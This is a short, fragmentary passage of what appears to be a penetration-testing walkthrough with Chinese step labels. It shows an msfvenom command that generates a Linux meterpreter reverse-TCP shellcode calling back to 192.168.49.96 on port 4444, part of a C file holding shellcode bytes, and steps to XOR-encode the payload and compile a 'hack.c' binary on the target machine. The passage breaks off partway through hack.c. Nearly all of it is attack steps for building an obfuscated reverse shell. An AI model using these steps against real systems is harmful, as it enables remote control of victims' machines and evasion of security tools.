...
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.96 LPORT=4444 -f c -o encoder.c
```
2. encoder.c
```c
#include <stdio.h>
...
"\x31\x60\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
...
3. 编译encoder.c 获取xor转换后结果
```
gcc encoder.c -o encoder.out
```

4. 将编译后结果放入hack.c中 再在目标机器编译生成hack文件
hack.c
```c
#include <stdio.h>
#include <stdlib.h>
